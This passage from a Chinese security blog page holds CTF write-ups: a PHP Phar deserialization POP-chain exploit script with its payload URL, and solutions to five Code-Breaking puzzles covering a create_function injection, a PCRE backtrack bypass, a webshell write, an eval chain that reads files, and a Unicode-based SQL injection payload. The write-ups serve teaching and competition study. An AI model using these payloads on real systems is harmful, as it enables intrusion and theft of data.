class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h3><p>file.php中用了<code>file_exists()</code>函数判断读取的文件是否存在，并且源码里面告诉你flag在f1ag.php里面，所以猜测考察用Phar反序列化去读取flag。<br>简单地浏览一下所有的php代码发现只有两个读取系统文件的函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight_file()</span><br><span class="line">file_get_contents()</span><br></pre></td></tr></table></figure></p>
-<p>pop链分析<br>首先看到Show类中的_show方法：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221223445-8fb34c80-052d-1.png" alt="image.png"></p>
-<p>可以看到f1ag被ban了，<code>highlight_file</code>利用不了<br>然后再看到Test类里面的file_get方法有<code>file_get_contents</code>函数，再回首file_get是在get方法里面调用的，而get方法是通过触发魔术方法<code>__get()</code>去调用的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__get()：获取类中的一个不可访问属性或者是不存在的属性会调用此方法</span><br></pre></td></tr></table></figure></p>
-<p>那么我们怎么去触发<code>__get</code>呢？再回到类Show中看到</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221230155-5b36346e-0531-1.png" alt="image.png"></p>
-<p>看到这里思路就很清晰了，只要我们把Test实例化的对象存储在str的数组中，然后再去调用source属性（即Test中不存在的属性），就可以触发<code>__get()</code>了。那么我们如何触发<code>__toString()</code>呢？<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()：将一个实例化对象当做一个字符串来使用时，会自动调用该方法</span><br></pre></td></tr></table></figure></p>
-<p>在看到C1e4r类里面，看到<code>__destruct()</code>刚好有对字符串的输出</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221231440-23664036-0533-1.png" alt="image.png"><br>整个pop链就很清晰了，最后就是写exp了</p>
-<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">    $fun1 = <span class="keyword">new</span> C1e4r();</span><br><span class="line">    $fun2 = <span class="keyword">new</span> Show();</span><br><span class="line">    $fun3 = <span class="keyword">new</span> Test();</span><br><span class="line">    $fun3-&gt;params[<span class="string">'source'</span>]=<span class="string">"/var/www/html/f1ag.php"</span>;</span><br><span class="line">    $fun2-&gt;str = <span class="keyword">array</span>(<span class="string">'str'</span>=&gt;$fun3);</span><br><span class="line">    $fun1-&gt;str = $fun2;</span><br><span class="line">    $phar-&gt;setMetadata($fun1);</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>构造文件名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>;</span><br></pre></td></tr></table></figure></p>
-<p>最后的payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.79.158.180:11115/file.php?file=phar://./upload/7bd59e11d401afdf6c1d291a33a940b2.jpg</span></span><br></pre></td></tr></table></figure></p>
-<p>getflag：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221233125-7a6a80d4-0535-1.png" alt="image.png"></p>
-<h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="https://paper.seebug.org/680/" title="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><br><a href="http://php.net/manual/en/phar.fileformat.phar.php" title="http://php.net/manual/en/phar.fileformat.phar.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.phar.php</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">一些姿势</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/24/Phar的一些利用姿势/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Code-Breaking-Puzzles做题记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/20/Code-Breaking-Puzzles做题记录/">Code-Breaking-Puzzles做题记录</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/20/Code-Breaking-Puzzles做题记录/" class="archive-article-date">
-  	<time datetime="2018-12-20T02:09:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>文章首发于先知社区<a href="https://xz.aliyun.com/t/3623" target="_blank" rel="noopener">https://xz.aliyun.com/t/3623</a></p>
-</blockquote>
-<p>传送门：<a href="https://code-breaking.com" title="https://code-breaking.com" target="_blank" rel="noopener">https://code-breaking.com</a></p>
-<ol>
-<li>function PHP函数利用技巧</li>
-<li>pcrewaf PHP正则特性</li>
-<li>phpmagic PHP写文件技巧</li>
-<li>phplimit PHP代码执行限制绕过</li>
-<li>nodechr Javascript字符串特性</li>
-</ol>
-<h1 id="1-easy-function"><a href="#1-easy-function" class="headerlink" title="1.easy - function"></a>1.easy - function</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>看到<code>$action(&#39;&#39;,$arg)</code>这里有两个参数，可以想到<code>create_function</code>匿名函数代码注入。那么问题来了，知道怎么执行命令但是正则怎么绕，从这个正则很容易知道只要我们在开头或者结尾加入其他字符就可以绕过了，bp来fuzz一波，发现%5c可以绕过。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175639-b78733c6-004f-1.png" alt="image.png"><br>为什么在函数前面加一个”\”也能执行呢，这里涉及到了php的全局命名空间，<code>\create_function</code>就是调用全局的<code>create_function</code>函数</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175719-cf670570-004f-1.png" alt="image.png"><br>看一下手册中的例子就大概知道是什么意思了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215195500-4007efe6-0060-1.png" alt="image.png"></p>
-<p>既然正则可以绕过了，那么就可以愉快的getflag了</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175811-ee3aa3bc-004f-1.png" alt="image.png"></p>
-<h1 id="2-easy-pcrewaf"><a href="#2-easy-pcrewaf" class="headerlink" title="2.easy - pcrewaf"></a>2.easy - pcrewaf</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;  <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>之前看过Ph师傅<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" title="这篇文章" target="_blank" rel="noopener">这篇文章</a>，所以这题做起来会很轻松。用php中正则的最大回溯次数<code>（pcre.backtrack_limit）</code>使正则失效，从而导致<code>is_php()</code>返回false。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180103-54ff9b3e-0050-1.png" alt="image.png"></p>
-<p>PHP中的正则回溯最大次数是100w次，只要超过这个值，正则匹配就会执行失败</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215201327-d3c742e8-0062-1.png" alt="image.png"><br>那么解题的思路就很清晰了，只要上传一个超长的字符串的文件，就可以绕过这个正则表达式了。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180121-5f9bd224-0050-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180201-775945b8-0050-1.png" alt="image.png"></p>
-<h1 id="3-easy-phpmagic"><a href="#3-easy-phpmagic" class="headerlink" title="3.easy - phpmagic"></a>3.easy - phpmagic</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码段1：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//代码段2：</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>$domain那里用了<code>escapeshellarg()</code>，命令注入这条走不通。</p>
-<p>文件内容我们可控，但是$output被<code>htmlspecialchars</code>转化为html实体，&lt;&gt;被干掉了，直接写shell不行，而且后缀限制得要死。</p>
-<p>翻了以前的笔记：php在做路径处理的时候，会递归的删除掉路径中存在的“/.”。<a href="http://wonderkun.cc/index.html/?p=626" title="详情看这里" target="_blank" rel="noopener">详情看这里</a>，所以我们只要在后缀后面加上/. pathifo就取不到后缀名了，并且我们可以正常上传一个php文件。<br>那么后缀限制就可以绕过了，写文件我们可以用伪协议流</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180507-e69ed62c-0050-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180514-ea606424-0050-1.png" alt="image.png"><br>但是$log_name前面被加上了<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>，查看了手册之后发现这个值我们是可控的</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180528-f2fd4af2-0050-1.png" alt="image.png"><br>在本地尝试了一波，发现这个值是取http响应头的host值。</p>
-<p>最后一个问题是我们怎么控制base64的长度呢，我们知道base64编码之后一定是4的倍数，解码也是按4位4位来解的，那么我们只要控制好$output的值使得我们shell可以正常解码就可以了</p>
-<p>还有一个trick：就是php在进行base64解码的时候如果遇到不是base64编码的字符会直接跳过</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180618-107d17ce-0051-1.png" alt="image.png"><br>发现我们是可以正常解码的。<br>然后我们再判断我们shell前面符合base64编码有多少就可以了，不够可以填充，不过刚好是符合4的倍数，无需填充</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180706-2d128720-0051-1.png" alt="image.png"><br>思路都ok了，那么我们就写shell吧<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180801-4e69462a-0051-1.png" alt></p>
-<p>可以成功上传<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180825-5c5603c2-0051-1.png" alt><br>getflag<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180900-7132ab38-0051-1.png" alt></p>
-<h1 id="4-easy-phplimit"><a href="#4-easy-phplimit" class="headerlink" title="4.easy - phplimit"></a>4.easy - phplimit</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里涉及到了PHP正则表达式的递归模式，不清楚什么是递归模式可以看这里 <a href="http://php.net/manual/zh/regexp.reference.recursive.php" title="http://php.net/manual/zh/regexp.reference.recursive.php" target="_blank" rel="noopener">http://php.net/manual/zh/regexp.reference.recursive.php</a>，</p>
-<p>题目中的正则表达式中的关键点是<code>(?R)?</code>，<code>(?R)</code>的作用就是递归地替换它所在的整条正则表达式. 在每次迭代时, PHP语法分析器都会将<code>(?R)</code>替换为 <code>&#39;/[^\W]+\((?R)?\)/&#39;</code>。</p>
-<p>那么上面真正表达式就一目了然了，就是传入的必须是函数，而且这个函数不能带入参数，类似于这种：func1(func2(func3()))，递归模式会一直递归匹配括号的内容下去。</p>
-<p>正则知道怎么走了，那么现在就用PHP不带参数的函数一把梭吧，在本地用了N个函数测试，最终payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=var_dump(file_get_contents(next(array_reverse(scandir(dirname(chdir(next(scandir(getcwd())))))))));</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215181715-98893016-0052-1.png" alt="image.png"></p>
-<p>还有另一种解法是利用：<code>get_defined_vars()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars()，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215181306-04007e40-0052-1.png" alt="image.png"><br>那么我们可以再提交一个参数过去，再用<code>get_defined_vars()</code>函数去获取</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215181731-a1c399be-0052-1.png" alt="image.png"></p>
-<h1 id="5-easy-nodechr"><a href="#5-easy-nodechr" class="headerlink" title="5.easy - nodechr"></a>5.easy - nodechr</h1><p>代码太长了，这里就贴出关键代码吧<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关键代码1：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//关键代码2：</span></span><br><span class="line"><span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line"><span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line"><span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user) &#123;</span><br><span class="line">        ctx.session.user = user</span><br><span class="line"></span><br><span class="line">        jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>很明显的sql注入，但是union，select被ban了，看着toUpperCase()这个很是诡异，再加上ph师傅给的tips，百度之，然后就百度到了ph师傅<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" title="这篇文章" target="_blank" rel="noopener">这篇文章</a><br>要点如下：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215191314-6a367202-005a-1.png" alt="image.png"><br>那么思路很清晰了，unıon.toUpperCase()==UNION，ſelect.toUpperCase()==SELECT</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215191754-11386b46-005b-1.png" alt="image.png"></p>
-<p>接下来就是简单的注入了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1%27 un%C4%B1on %C5%BFelect null,(%C5%BFelect flag from flags),&apos;null</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215194640-16261d0c-005f-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215194703-23cd9624-005f-1.png" alt="image.png"></p>
-<h1 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h1><p>这几道题目考察很多有意思的东西，也感谢ph师傅出这几道很Nice的题目，涨了不少姿势。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/20/Code-Breaking-Puzzles做题记录/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
+    <nav id="page-nav">
